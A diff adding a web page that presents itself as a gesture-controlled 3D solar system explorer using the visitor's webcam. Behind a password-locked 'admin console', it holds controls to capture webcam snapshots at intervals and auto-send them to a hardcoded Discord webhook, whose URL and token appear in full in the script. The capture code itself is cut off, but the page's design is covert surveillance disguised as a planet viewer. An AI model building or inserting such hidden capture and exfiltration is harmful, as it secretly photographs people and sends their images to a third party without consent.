+                border-radius: 0;
+            }
+
+            .planet-dot {
+                width: 13px;
+                height: 13px;
+            }
+
+            /* Tooltip above each dot */
+            .planet-dot::after {
+                left: 50%;
+                top: -18px;
+                transform: translateX(-50%);
+                font-size: 8px;
+                letter-spacing: 1px;
+            }
+
+            /* Gesture hint inside chrome bar */
+            #gesture-hint {
+                position: fixed !important;
+                bottom: 60px;
+                width: 100%;
+                font-size: 8px;
+                letter-spacing: 1px;
+                opacity: 0.8;
+                padding: 0;
+                text-align: center;
+                white-space: nowrap;
+                pointer-events: none;
+                z-index: 25;
+            }
+
+            /* ── HUD: bottom sheet ABOVE the chrome bar ── */
+            #hud {
+                top: auto;
+                right: 0;
+                left: 0;
+                bottom: 64px;
+                /* sit on top of chrome bar */
+                width: 100%;
+                border-radius: 18px 18px 0 0;
+                padding: 0 16px 14px;
+                transform: translateY(100%);
+                max-height: 52vh;
+                overflow-y: auto;
+                -webkit-overflow-scrolling: touch;
+                border-left: none;
+                border-right: none;
+                border-bottom: none;
+                box-shadow: 0 -4px 30px rgba(0, 255, 255, 0.15);
+                z-index: 15;
+            }
+
+            #hud.active {
+                transform: translateY(0);
+            }
+
+            #hud::before {
+                display: none;
+            }
+
+            /* Drag handle at top of HUD */
+            #hud-handle {
+                display: block !important;
+                width: 36px;
+                height: 4px;
+                background: rgba(0, 255, 255, 0.35);
+                border-radius: 2px;
+                margin: 10px auto 10px;
+                flex-shrink: 0;
+            }
+
+            #hud h2 {
+                font-size: 15px;
+                letter-spacing: 2px;
+                padding-bottom: 8px;
+                margin-bottom: 2px;
+            }
+
+            .data-row {
+                margin: 8px 0;
+                font-size: 12px;
+                padding-bottom: 5px;
+            }
+
+            .label {
+                font-size: 10px;
+            }
+
+            .value {
+                font-size: 13px;
+            }
+
+            #p-desc {
+                font-size: 11px;
+                line-height: 1.65;
+                padding-top: 10px;
+                margin-bottom: 8px;
+            }
+
+            /* ── HUD close button on mobile ── */
+            #hud-close {
+                display: flex !important;
+                position: absolute;
+                top: 12px;
+                right: 14px;
+                width: 26px;
+                height: 26px;
+                align-items: center;
+                justify-content: center;
+                border: 1px solid rgba(0, 255, 255, 0.3);
+                border-radius: 50%;
+                font-size: 12px;
+                cursor: pointer;
+                color: var(--cyan);
+                background: rgba(0, 0, 0, 0.4);
+                z-index: 2;
+            }
+
+            /* ── Admin panel ── */
+            .admin-body {
+                grid-template-columns: 1fr;
+                padding: 10px;
+                gap: 10px;
+            }
+
+            .admin-card.full-width {
+                grid-column: 1;
+            }
+
+            .admin-card {
+                padding: 14px;
+                border-radius: 12px;
+            }
+
+            .admin-header {
+                padding: 12px 14px;
+            }
+
+            .admin-title {
+                font-size: 10px;
+                letter-spacing: 2px;
+            }
+
+            .ctrl-btn {
+                padding: 10px 14px;
+                font-size: 11px;
+                letter-spacing: 1px;
+            }
+
+            .stat-num {
+                font-size: 20px;
+            }
+
+            input[type="number"] {
+                width: 85px;
+                font-size: 13px;
+            }
+
+            #capture-log {
+                height: 120px;
+            }
+
+            #img-gallery {
+                grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+                max-height: 200px;
+            }
+
+            /* ── Lock screen ── */
+            .lock-logo {
+                font-size: 24px;
+                letter-spacing: 4px;
+                margin-bottom: 6px;
+            }
+
+            .lock-subtitle {
+                font-size: 9px;
+                letter-spacing: 2px;
+                margin-bottom: 20px;
+            }
+
+            .lock-box {
+                width: calc(100% - 28px);
+                max-width: 340px;
+                padding: 22px 18px;
+            }
+
+            .lock-icon {
+                font-size: 28px;
+                margin-bottom: 10px;
+            }
+
+            .lock-input {
+                font-size: 16px;
+                padding: 11px 12px;
+                letter-spacing: 6px;
+            }
+
+            .lock-btn {
+                font-size: 11px;
+                letter-spacing: 2px;
+                padding: 12px;
+                margin-top: 14px;
+            }
+
+            /* Toast */
+            #admin-toast {
+                font-size: 11px;
+                padding: 9px 14px;
+                max-width: 88vw;
+                white-space: normal;
+                text-align: center;
+                bottom: 72px;
+                top: auto;
+            }
+
+            /* Lightbox */
+            #lightbox img {
+                max-width: 96vw;
+                max-height: 72vh;
+            }
+        }
+
+        /* ── Very small phones (< 380px) ── */
+        @media (max-width:380px) {
+            #planet-nav {
+                gap: 11px;
+            }
+
+            .planet-dot {
+                width: 11px;
+                height: 11px;
+            }
+
+            #hud {
+                max-height: 58vh;
+            }
+
+            .lock-box {
+                padding: 18px 12px;
+            }
+
+            #mobile-bottom-bar {
+                height: 60px;
+            }
+
+            #hud {
+                bottom: 60px;
+            }
+        }
+
+        /* ── Landscape mobile ── */
+        @media (max-width:900px) and (orientation:landscape) {
+            #mobile-bottom-bar {
+                display: none !important;
+            }
+
+            /* Restore desktop-like nav on left */
+            #planet-nav {
+                position: fixed !important;
+                left: 14px;
+                top: 50%;
+                transform: translateY(-50%) !important;
+                flex-direction: column;
+                gap: 13px;
+                background: none;
+                border: none;
+                padding: 0;
+                z-index: 10;
+            }
+
+            /* HUD from right side - floating like desktop */
+            #hud {
+                top: 10px;
+                right: 10px;
+                bottom: auto;
+                left: auto;
+                max-height: 85vh;
+                transform: translateX(120%);
+                border-radius: 12px;
+                width: 320px;
+                padding: 16px;
+                border: 1px solid rgba(0, 255, 255, 0.2);
+                z-index: 15;
+            }
+
+            #hud.active {
+                transform: translateX(0);
+            }
+
+            #hud-handle {
+                display: none !important;
+            }
+
+            #hand-preview {
+                top: 48px;
+                right: auto;
+                left: 10px;
+            }
+
+            #gesture-hint {
+                display: none;
+            }
+        }
+
+        /* ── Elements hidden on desktop, shown on mobile ── */
+        #mobile-bottom-bar {
+            display: none;
+        }
+
+        #hud-handle {
+            display: none;
+        }
+
+        #hud-close {
+            display: none;
+        }
+
+        /* Gesture overlay badge */
+        #gesture-badge {
+            /* overrides above — desktop stays bottom-left near camera */
+            transform: translateY(8px);
+            background: rgba(0, 8, 20, 0.88);
+            border: 1px solid rgba(0,255,255,0.5);
+            border-radius: 10px;
+            padding: 10px 16px;
+            color: var(--cyan);
+            z-index: 50;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s, transform 0.2s;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            box-shadow: 0 0 18px rgba(0,255,255,0.15);
+        }
+
+        #gesture-badge.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- MAIN SOLAR SYSTEM -->
+    <div id="canvas-container"></div>
+    <div class="corner-tl"></div>
+    <div class="corner-br"></div>
+
+    <div id="top-bar">
+        <div class="sys-title">&#9672; SOLAR EXPLORER</div>
+        <span style="opacity:0.3;font-size:9px;letter-spacing:3px;">HOLOGRAPHIC INTERFACE v2.0</span>
+        <div class="clock" id="clock">--:--:--</div>
+    </div>
+
+    <div id="planet-nav"></div>
+
+    <div id="hud">
+        <div id="hud-handle"></div>
+        <button id="hud-close">&#10005;</button>
+        <h2 id="p-name">PLANET_SCAN</h2>
+        <div class="data-row"><span class="label">DISTANCE</span><span class="value" id="p-dist">-</span></div>
+        <div class="data-row"><span class="label">GRAVITY</span><span class="value" id="p-grav">-</span></div>
+        <div class="data-row"><span class="label">TEMP</span><span class="value" id="p-temp">-</span></div>
+        <div class="data-row"><span class="label">TYPE</span><span class="value" id="p-type">-</span></div>
+        <p id="p-desc"></p>
+    </div>
+
+    <div id="hand-preview">
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+    <canvas id="capture-canvas" style="display:none;"></canvas>
+
+    <!-- Gesture badge (mobile flash feedback) -->
+    <div id="gesture-badge"><span class="gesture-badge-icon" id="gesture-badge-icon"></span><span class="gesture-badge-text" id="gesture-badge-text"></span></div>
+
+    <!-- Gesture Trail Canvas -->
+    <canvas id="gesture-trail"></canvas>
+
+    <!-- Status pills -->
+    <div id="status-bar">
+        <div class="status-pill speed" id="pill-speed">⚡ SPEED BOOST</div>
+        <div class="status-pill tour"  id="pill-tour">🚀 AUTO-TOUR</div>
+        <div class="status-pill lock"  id="pill-lock">🔒 ROTATION LOCKED</div>
+        <div class="status-pill orbit" id="pill-orbit">🔵 ORBITS OFF</div>
+    </div>
+
+    <!-- (Planet nav is positioned fixed via CSS) -->
+
+    <!-- Gesture Hint - desktop shows all, mobile shows only 3 key gestures -->
+    <div id="gesture-hint" class="gesture-hint-full">
+        🖐️ ROTATE &nbsp;|&nbsp; 🤌 ZOOM &nbsp;|&nbsp; ☝️ NEXT &nbsp;|&nbsp; ✌️ PREV &nbsp;|&nbsp; ✊ SUN &nbsp;|&nbsp; 🤟 BOOST &nbsp;|&nbsp; 👌 ORBITS &nbsp;|&nbsp; 🤙 SNAP &nbsp;|&nbsp; 🖖 TOUR
+    </div>
+    <div id="gesture-hint-mobile" class="gesture-hint-short">
+        ☝️ NEXT &nbsp;|&nbsp; ✌️ PREV &nbsp;|&nbsp; ✊ SUN VIEW
+    </div>
+
+    <!-- Gesture Guide Panel - compact, mobile-first -->
+    <div id="gesture-guide">
+        <div class="guide-title">✋ GESTURES</div>
+        <div class="guide-list">
+            <div class="guide-row"><span class="gr-icon">🖐️</span><span class="gr-name">OPEN PALM</span><span class="gr-action">Rotate view</span></div>
+            <div class="guide-row"><span class="gr-icon">🤌</span><span class="gr-name">PINCH</span><span class="gr-action">Zoom in / out</span></div>
+            <div class="guide-row"><span class="gr-icon">☝️</span><span class="gr-name">INDEX UP</span><span class="gr-action">Next planet</span></div>
+            <div class="guide-row"><span class="gr-icon">✌️</span><span class="gr-name">PEACE</span><span class="gr-action">Previous planet</span></div>
+            <div class="guide-row"><span class="gr-icon">✊</span><span class="gr-name">FIST</span><span class="gr-action">Reset to Sun</span></div>
+            <div class="guide-row"><span class="gr-icon">🤟</span><span class="gr-name">3 FINGERS</span><span class="gr-action">Speed boost</span></div>
+            <div class="guide-row"><span class="gr-icon">👌</span><span class="gr-name">OK SIGN</span><span class="gr-action">Toggle orbits</span></div>
+            <div class="guide-row"><span class="gr-icon">🤙</span><span class="gr-name">SHAKA</span><span class="gr-action">Snapshot</span></div>
+            <div class="guide-row"><span class="gr-icon">🖖</span><span class="gr-name">VULCAN</span><span class="gr-action">Auto-tour</span></div>
+        </div>
+        <div class="guide-shortcuts">
+            <div class="gs-title">⌨️ KEYBOARD</div>
+            <div class="gs-grid">
+                <span>← →</span><span>Prev / Next planet</span>
+                <span>Space</span><span>Reset to Sun</span>
+                <span>T</span><span>Auto-tour</span>
+                <span>B</span><span>Speed boost</span>
+                <span>O</span><span>Orbits on/off</span>
+                <span>S</span><span>Snapshot</span>
+            </div>
+        </div>
+        <button class="guide-close-btn" id="guide-close-btn">✕ CLOSE</button>
+    </div>
+
+    <!-- Gesture Help Button -->
+    <button id="gesture-help-btn" title="Show gesture guide">❓</button>
+
+    <!-- LOCK SCREEN -->
+    <div id="lockscreen">
+        <div class="lock-logo">&#9672; SYS</div>
+        <div class="lock-subtitle">RESTRICTED ACCESS &mdash; ADMIN CONSOLE</div>
+        <div class="lock-box">
+            <div class="lock-icon">&#128272;</div>
+            <div class="lock-label">ENTER AUTHORIZATION CODE</div>
+            <input class="lock-input" id="lock-input" type="password"
+                placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" autocomplete="off" spellcheck="false">
+            <button class="lock-btn" id="lock-submit-btn">AUTHENTICATE &rarr;</button>
+            <div class="lock-error" id="lock-error">&#9888; INVALID AUTHORIZATION CODE</div>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div id="admin-panel">
+        <div class="admin-header">
+            <div class="admin-status-dot" id="admin-status-dot"></div>
+            <div class="admin-title">ADMIN CONSOLE &mdash; /998765</div>
+            <button class="admin-close-btn" id="admin-close-btn">&times; CLOSE</button>
+        </div>
+        <div class="admin-body">
+            <!-- Capture Controls -->
+            <div class="admin-card">
+                <div class="card-title"><span>&#128247; CAPTURE CONTROL</span></div>
+                <div class="capture-status">
+                    <div class="status-badge stopped" id="cap-badge">STOPPED</div>
+                </div>
+                <div style="display:flex;gap:12px;flex-wrap:wrap;">
+                    <button class="ctrl-btn start" id="start-cap-btn">&#9654; START CAPTURE</button>
+                    <button class="ctrl-btn stop" id="stop-cap-btn">&#9209; STOP CAPTURE</button>
+                    <button class="ctrl-btn primary" id="snap-now-btn">&#128248; SNAP NOW</button>
+                </div>
+                <div class="interval-row" style="margin-top:24px;">
+                    <span class="interval-label">INTERVAL</span>
+                    <input type="range" id="interval-slider" min="2" max="120" value="5">
+                    <span class="interval-val"><span id="interval-display">5</span>s</span>
+                </div>
+                <div class="interval-row" style="margin-top:8px;gap:8px;">
+                    <span class="interval-label" style="font-size:10px;">MANUAL (sec)</span>
+                    <input type="number" id="interval-manual" value="5" min="2" max="3600" placeholder="seconds">
+                    <button class="ctrl-btn primary" id="apply-interval-btn"
+                        style="padding:10px 16px;font-size:11px;">APPLY</button>
+                </div>
+            </div>
+            <!-- Stats -->
+            <div class="admin-card">
+                <div class="card-title"><span>&#128202; SESSION STATS</span></div>
+                <div class="stat-grid">
+                    <div class="stat-box">
+                        <div class="stat-num" id="stat-captured">0</div>
+                        <div class="stat-label">CAPTURED</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-num" id="stat-sent">0</div>
+                        <div class="stat-label">SENT</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-num" id="stat-interval">5s</div>
+                        <div class="stat-label">INTERVAL</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-num" id="stat-session">0m</div>
+                        <div class="stat-label">SESSION</div>
+                    </div>
+                </div>
+            </div>
+            <!-- Webhook -->
+            <div class="admin-card">
+                <div class="card-title"><span>&#128279; WEBHOOK CONFIGURATION</span></div>
+                <div style="margin-bottom:14px;font-size:11px;opacity:0.5;letter-spacing:1px;">Discord webhook URL for
+                    image delivery</div>
+                <div class="wh-row">
+                    <input class="wh-input" id="webhook-url" type="text"
+                        placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+                    <button class="ctrl-btn primary" id="save-wh-btn" style="white-space:nowrap;">&#128190;
+                        SAVE</button>
+                    <button class="ctrl-btn warn" id="test-wh-btn" style="white-space:nowrap;">&#9889; TEST</button>
+                </div>
+                <div style="margin-top:16px;">
+                    <div style="font-size:11px;opacity:0.5;letter-spacing:2px;margin-bottom:10px;">SEND OPTIONS</div>
+                    <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap;">
+                        <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;"><input
+                                type="checkbox" id="send-on-capture" checked style="accent-color:var(--cyan);">
+                            Auto-send on capture</label>
+                        <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;"><input
+                                type="checkbox" id="include-timestamp" checked style="accent-color:var(--cyan);">
+                            Include timestamp</label>
+                        <select id="img-quality">
+                            <option value="0.9">Quality: HIGH</option>
+                            <option value="0.7" selected>Quality: MEDIUM</option>
+                            <option value="0.5">Quality: LOW</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+            <!-- Password -->
+            <div class="admin-card">
+                <div class="card-title"><span>&#128273; CHANGE PASSWORD</span></div>
+                <div class="pw-row">
+                    <input type="password" id="pw-current" placeholder="Current password" autocomplete="off">
+                    <input type="password" id="pw-new" placeholder="New password" autocomplete="off">
+                    <input type="password" id="pw-confirm" placeholder="Confirm new password" autocomplete="off">
+                    <div><button class="ctrl-btn primary" id="pw-change-btn">&#128274; CHANGE PASSWORD</button></div>
+                    <div class="pw-msg" id="pw-msg"></div>
+                </div>
+            </div>
+            <!-- Log -->
+            <div class="admin-card full-width">
+                <div class="card-title"><span>&#128203; CAPTURE LOG</span><button class="ctrl-btn warn"
+                        id="clear-log-btn" style="padding:6px 14px;font-size:10px;border-radius:6px;">&#128465;
+                        CLEAR</button></div>
+                <div id="capture-log">
+                    <div class="log-entry info"><span class="ts">[SYSTEM]</span> Admin console initialized. Awaiting
+                        commands.</div>
+                </div>
+            </div>
+            <!-- Gallery -->
+            <div class="admin-card full-width">
+                <div class="card-title"><span>&#128444; CAPTURED IMAGES</span>
+                    <div style="display:flex;gap:10px;">
+                        <button class="ctrl-btn primary" id="dl-all-btn"
+                            style="padding:6px 14px;font-size:10px;border-radius:6px;">&#11015; DOWNLOAD ALL</button>
+                        <button class="ctrl-btn stop" id="clear-gallery-btn"
+                            style="padding:6px 14px;font-size:10px;border-radius:6px;">&#128465; CLEAR</button>
+                    </div>
+                </div>
+                <div id="img-gallery">
+                    <div class="gallery-empty">No images captured yet.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lightbox -->
+    <div id="lightbox">
+        <img id="lightbox-img" src="" alt="Captured">
+        <div id="lightbox-close">&times; CLOSE</div>
+    </div>
+    <!-- Toast -->
+    <div id="admin-toast"></div>
+
+    <!-- Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+
+    <script>
+
+        // -------- Discord webhook (fixed) ----------
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1553477891982102648/eKqQgyaxVK6kgg9KPdMhGQFbEZ73LrnP5_4bPA-70jeUeTNGdRtDhZ5S53neUlQMujPL';
+        // ══════════════════════════════════════════
+        //  PLANET DATA
+        // ══════════════════════════════════════════
+        const planetData = [
+            { name: "Sun", dist: "0 km", grav: "274 m/s²", temp: "5,500°C", type: "G-Type Star", color: 0xffcc00, size: 5, orbitalDist: 0, speed: 0, desc: "The center of our solar system, a nearly perfect sphere of hot plasma." },
+            { name: "Mercury", dist: "57.9M km", grav: "3.7 m/s²", temp: "167°C", type: "Terrestrial", color: 0xaaaaaa, size: 0.5, orbitalDist: 10, speed: 0.04, desc: "The smallest planet and closest to the Sun, with extreme temperature swings." },
+            { name: "Venus", dist: "108M km", grav: "8.87 m/s²", temp: "464°C", type: "Terrestrial", color: 0xe3bb76, size: 0.9, orbitalDist: 14, speed: 0.015, desc: "Earth's twin in size, but with a runaway greenhouse effect and thick atmosphere." },
+            { name: "Earth", dist: "149M km", grav: "9.8 m/s²", temp: "15°C", type: "Terrestrial", color: 0x2233ff, size: 1, orbitalDist: 18, speed: 0.01, desc: "Our home. The only known planet with life, liquid water, and breathable air." },
+            { name: "Mars", dist: "227M km", grav: "3.71 m/s²", temp: "-65°C", type: "Terrestrial", color: 0xff4422, size: 0.6, orbitalDist: 22, speed: 0.008, desc: "The Red Planet. Home to Olympus Mons, tallest mountain in the solar system." },
+            { name: "Jupiter", dist: "778M km", grav: "24.79 m/s²", temp: "-110°C", type: "Gas Giant", color: 0xffa500, size: 2.5, orbitalDist: 30, speed: 0.004, desc: "The king of planets. More than twice as massive as all other planets combined." },
+            { name: "Saturn", dist: "1.4B km", grav: "10.44 m/s²", temp: "-140°C", type: "Gas Giant", color: 0xf4a460, size: 2.2, orbitalDist: 38, speed: 0.002, desc: "Adorned with a dazzling, complex system of icy rings visible from Earth." },
+        ];
+
+        // ── Mobile helper ──
+        function isMobile() { return window.innerWidth <= 768 || /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent); }
+
+        // ══════════════════════════════════════════
+        //  THREE.JS SCENE
+        // ══════════════════════════════════════════
+        let scene, camera, renderer, planets = [], orbitGroups = [];
+        let focusIndex = 0;
+        let isZoomed = false;
+        let rotationTarget = { x: 0, y: 0 };
+        let currentZoom = 50;
+
+        function initScene() {
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(60, innerWidth / innerHeight, 0.1, 2000);
+            camera.position.set(0, 30, 60);
+
+            renderer = new THREE.WebGLRenderer({ antialias: !isMobile(), alpha: true, powerPreference: 'high-performance' });
+            renderer.setSize(innerWidth, innerHeight);
+            renderer.setPixelRatio(Math.min(devicePixelRatio, 2)); // cap at 2 for mobile perf
+            document.getElementById('canvas-container').appendChild(renderer.domElement);
+
+            scene.add(new THREE.AmbientLight(0x404040, 2));
+            const sunLight = new THREE.PointLight(0xffffff, 3, 500);
+            scene.add(sunLight);
+
+            // Starfield — fewer stars on mobile for perf
+            const starGeo = new THREE.BufferGeometry();
+            const starPos = [];
+            const starCount = isMobile() ? 5000 : 12000;
+            for (let i = 0; i < starCount; i++) {
+                starPos.push((Math.random() - .5) * 1000, (Math.random() - .5) * 1000, (Math.random() - .5) * 1000);
+            }
+            starGeo.setAttribute('position', new THREE.Float32BufferAttribute(starPos, 3));
+            scene.add(new THREE.Points(starGeo, new THREE.PointsMaterial({ color: 0xffffff, size: 0.6 })));
+
+            // Create Planets
+            planetData.forEach((data, i) => {
+                const group = new THREE.Group();
+                const geo = new THREE.SphereGeometry(data.size, 32, 32);
+                const mat = new THREE.MeshStandardMaterial({
+                    color: data.color,
+                    emissive: data.name === "Sun" ? data.color : 0x000000,
+                    emissiveIntensity: data.name === "Sun" ? 1 : 0,
+                    roughness: 0.7
+                });
+                const mesh = new THREE.Mesh(geo, mat);
+                mesh.position.x = data.orbitalDist;
+
+                const glowGeo = new THREE.SphereGeometry(data.size * 1.2, 32, 32);
+                const glowMat = new THREE.MeshBasicMaterial({ color: data.color, transparent: true, opacity: 0.12, side: THREE.BackSide });
+                mesh.add(new THREE.Mesh(glowGeo, glowMat));
+
+                if (data.name === "Saturn") {
+                    const ringGeo = new THREE.RingGeometry(3, 5, 64);
+                    const ringMat = new THREE.MeshBasicMaterial({ color: 0xf4a460, side: THREE.DoubleSide, transparent: true, opacity: 0.5 });
+                    const ring = new THREE.Mesh(ringGeo, ringMat);
+                    ring.rotation.x = Math.PI / 2;
+                    mesh.add(ring);
+                }
+
+                if (data.orbitalDist > 0) {
+                    const lineGeo = new THREE.RingGeometry(data.orbitalDist - 0.05, data.orbitalDist + 0.05, 128);
+                    const lineMat = new THREE.MeshBasicMaterial({ color: 0x00ffff, transparent: true, opacity: 0.1, side: THREE.DoubleSide });
+                    const line = new THREE.Mesh(lineGeo, lineMat);
+                    line.rotation.x = Math.PI / 2;
+                    scene.add(line);
+                }
+
+                group.add(mesh);
+                scene.add(group);
+                planets.push(mesh);
+                orbitGroups.push(group);
+            });
+
+            // Build planet nav dots
+            const nav = document.getElementById('planet-nav');
+            planetData.forEach((d, i) => {
+                const dot = document.createElement('div');
+                dot.className = 'planet-dot' + (i === 0 ? ' active' : '');
+                dot.setAttribute('data-name', d.name);
+                dot.style.borderColor = '#' + d.color.toString(16).padStart(6, '0');
+                if (i === 0) dot.style.background = '#' + d.color.toString(16).padStart(6, '0');
+                dot.addEventListener('click', () => {
+                    focusIndex = i;
+                    updateHUD(i);
+                });
+                nav.appendChild(dot);
+            });
+        }
+
+        function updateHUD(index) {
+            const data = planetData[index];
+            document.getElementById('hud').classList.toggle('active', index !== 0);
+            document.getElementById('p-name').innerText = data.name;
+            document.getElementById('p-dist').innerText = data.dist;
+            document.getElementById('p-grav').innerText = data.grav;
+            document.getElementById('p-temp').innerText = data.temp;
+            document.getElementById('p-type').innerText = data.type;
+            document.getElementById('p-desc').innerText = data.desc;
+            document.querySelectorAll('.planet-dot').forEach((d, i) => d.classList.toggle('active', i === index));
+        }
+
+        // Click planets (desktop)
+        const raycaster = new THREE.Raycaster();
+        const mouse = new THREE.Vector2();
+
+        function castRay(clientX, clientY) {
+            if (!renderer) return;
+            const rect = renderer.domElement.getBoundingClientRect();
+            mouse.x = ((clientX - rect.left) / rect.width) * 2 - 1;
+            mouse.y = -((clientY - rect.top) / rect.height) * 2 + 1;
+            raycaster.setFromCamera(mouse, camera);
+            const hits = raycaster.intersectObjects(planets);
+            if (hits.length > 0) {
+                const idx = planets.indexOf(hits[0].object);
+                if (idx >= 0) { focusIndex = idx; updateHUD(idx); }
+            }
+        }
+
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('#admin-panel,#lockscreen,#hud,#planet-nav,#hand-preview')) return;
+            castRay(e.clientX, e.clientY);
+        });
+
+        // ── State flags for new features ──
+        let speedBoost = false;
+        let autoTour = false;
+        let rotationLocked = false;
+        let orbitsVisible = true;
+        let autoTourTimer = null;
+        let orbitMeshes = []; // collected orbit ring meshes
+
+        // ── Collect orbit rings after scene init ──
+        function collectOrbitMeshes() {
+            scene.children.forEach(obj => {
+                if (obj.isMesh && obj.geometry && obj.geometry.type === 'RingGeometry' && obj.material && obj.material.opacity < 0.3) {
+                    orbitMeshes.push(obj);
+                }
+            });
+        }
+
+        function toggleOrbits() {
+            orbitsVisible = !orbitsVisible;
+            orbitMeshes.forEach(m => { m.visible = orbitsVisible; });
+            setPill('orbit', !orbitsVisible, '🔵 ORBITS OFF');
+            showGestureBadge('👌', orbitsVisible ? 'ORBITS ON' : 'ORBITS OFF');
+        }
+
+        function toggleSpeedBoost() {
+            speedBoost = !speedBoost;
+            setPill('speed', speedBoost, '⚡ SPEED BOOST');
+            showGestureBadge('🤟', speedBoost ? 'BOOST ON' : 'BOOST OFF');
+        }
+
+        function toggleAutoTour() {
+            autoTour = !autoTour;
+            setPill('tour', autoTour, '🚀 AUTO-TOUR');
+            showGestureBadge('🖖', autoTour ? 'TOUR STARTED' : 'TOUR STOPPED');
+            if (autoTour) { scheduleAutoTour(); }
+            else { clearTimeout(autoTourTimer); }
+        }
+
+        function scheduleAutoTour() {
+            if (!autoTour) return;
+            autoTourTimer = setTimeout(() => {
+                focusIndex = (focusIndex + 1) % planetData.length;
+                updateHUD(focusIndex);
+                scheduleAutoTour();
+            }, 4000);
+        }
+
+        function toggleRotationLock() {
+            rotationLocked = !rotationLocked;
+            setPill('lock', rotationLocked, rotationLocked ? '🔒 ROTATION LOCKED' : '🔓 ROTATION FREE');
+            showGestureBadge('👆', rotationLocked ? 'LOCKED' : 'UNLOCKED');
+        }
+
+        function setPill(id, active, label) {
+            const el = document.getElementById('pill-' + id);
+            if (!el) return;
+            el.textContent = label;
+            el.classList.toggle('active', active);
+        }
+
+        // ── Gesture Trail Canvas ──
+        const trailCanvas = document.getElementById('gesture-trail');
+        const trailCtx = trailCanvas.getContext('2d');
+        let trailPoints = [];
+        function resizeTrail() {
+            trailCanvas.width  = innerWidth;
+            trailCanvas.height = innerHeight;
+        }
+        resizeTrail();
+        window.addEventListener('resize', resizeTrail);
+
+        function drawTrail(x, y) {
+            trailPoints.push({ x, y, t: Date.now() });
+            trailPoints = trailPoints.filter(p => Date.now() - p.t < 600);
+            trailCtx.clearRect(0, 0, trailCanvas.width, trailCanvas.height);
+            if (trailPoints.length < 2) return;
+            for (let i = 1; i < trailPoints.length; i++) {
+                const age = (Date.now() - trailPoints[i].t) / 600;
+                const alpha = 1 - age;
+                trailCtx.beginPath();
+                trailCtx.moveTo(trailPoints[i-1].x, trailPoints[i-1].y);
+                trailCtx.lineTo(trailPoints[i].x, trailPoints[i].y);
+                trailCtx.strokeStyle = `rgba(0,255,255,${alpha * 0.7})`;
+                trailCtx.lineWidth = (1 - age) * 4 + 1;
+                trailCtx.lineCap = 'round';
+                trailCtx.stroke();
+            }
+        }
+
+        // Advanced Touch Gestures
+        let touchStart = null;
+        let lastTap = 0;
+        let touchDragging = false;
+        let initialPinchDist = 0;
+        let touchRotating = false;
+        let initialPinchAngle = 0;
+
+        document.getElementById('hud-close')?.addEventListener('click', () => {
+            document.getElementById('hud').classList.remove('active');
+        });
+
+        function showGestureBadge(icon, msg) {
+            const b = document.getElementById('gesture-badge');
+            const iEl = document.getElementById('gesture-badge-icon');
+            const tEl = document.getElementById('gesture-badge-text');
+            if (!b) return;
+            if (iEl) iEl.textContent = icon || '';
+            if (tEl) tEl.textContent = msg || icon || '';
+            if (!msg && !icon) { if (iEl) iEl.textContent = ''; if (tEl) tEl.textContent = icon || ''; }
+            b.classList.add('show');
+            clearTimeout(b._hideTimer);
+            b._hideTimer = setTimeout(() => b.classList.remove('show'), 1000);
+        }
+
+        document.addEventListener('touchstart', (e) => {
+            if (e.target.closest('#admin-panel,#lockscreen,#hud,#planet-nav,#hand-preview,#admin-toast,#lightbox,#gesture-guide,#gesture-help-btn')) return;
+            if (e.touches.length === 2) {
+                initialPinchDist = Math.hypot(
+                    e.touches[0].clientX - e.touches[1].clientX,
+                    e.touches[0].clientY - e.touches[1].clientY
+                );
+                initialPinchAngle = Math.atan2(
+                    e.touches[1].clientY - e.touches[0].clientY,
+                    e.touches[1].clientX - e.touches[0].clientX
+                );
+                touchRotating = false;
+                return;
+            }
+            if (e.touches.length === 3) {
+                // 3-finger tap → toggle speed boost
+                toggleSpeedBoost();
+                return;
+            }
+            touchStart = { x: e.touches[0].clientX, y: e.touches[0].clientY, t: Date.now() };
+            touchDragging = false;
+        }, { passive: true });
+
+        document.addEventListener('touchmove', (e) => {
+            if (e.target.closest('#admin-panel,#lockscreen,#hud')) return;
+
+            if (e.touches.length === 2 && initialPinchDist > 0) {
+                const dist = Math.hypot(
+                    e.touches[0].clientX - e.touches[1].clientX,
+                    e.touches[0].clientY - e.touches[1].clientY
+                );
+                const angle = Math.atan2(
+                    e.touches[1].clientY - e.touches[0].clientY,
+                    e.touches[1].clientX - e.touches[0].clientX
+                );
+                // Pinch to zoom
+                if (dist > initialPinchDist + 10) {
+                    isZoomed = true;
+                    currentZoom = THREE.MathUtils.lerp(currentZoom, 8, 0.12);
+                } else if (dist < initialPinchDist - 10) {
+                    isZoomed = false;
+                    currentZoom = THREE.MathUtils.lerp(currentZoom, 65, 0.12);
+                }
+                // 2-finger twist = rotate around Y
+                const dAngle = angle - initialPinchAngle;
+                if (Math.abs(dAngle) > 0.05 && !rotationLocked) {
+                    rotationTarget.x += dAngle * 0.3;
+                    touchRotating = true;
+                }
+                initialPinchAngle = angle;
+                return;
+            }
+
+            if (!touchStart) return;
+            const tx = e.touches[0].clientX;
+            const ty = e.touches[0].clientY;
+            const dx = tx - touchStart.x;
